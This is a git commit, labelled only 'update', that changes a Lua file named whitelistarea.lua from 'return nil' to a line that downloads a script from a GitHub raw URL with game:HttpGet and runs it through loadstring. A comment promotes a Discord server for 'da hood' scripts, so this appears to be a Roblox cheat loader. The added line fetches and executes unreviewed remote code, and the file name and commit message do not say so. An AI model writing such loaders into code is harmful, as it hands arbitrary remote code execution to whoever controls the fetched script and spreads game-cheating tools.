53b466a5a0138d53ffb184d6ede1acbed60ae3ee
random <78721749+LPrandom@users.noreply.github.com>
2021-12-02 23:48:37 -1000

    update

--- whitelistarea.lua
+++ whitelistarea.lua
@@ -1,1 +1,2 @@
-return nil
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Christhegod2662/tacoseller/main/script.lua"))()
+--fuck taco, join discord.gg/encrypt #1 best script da hood ez
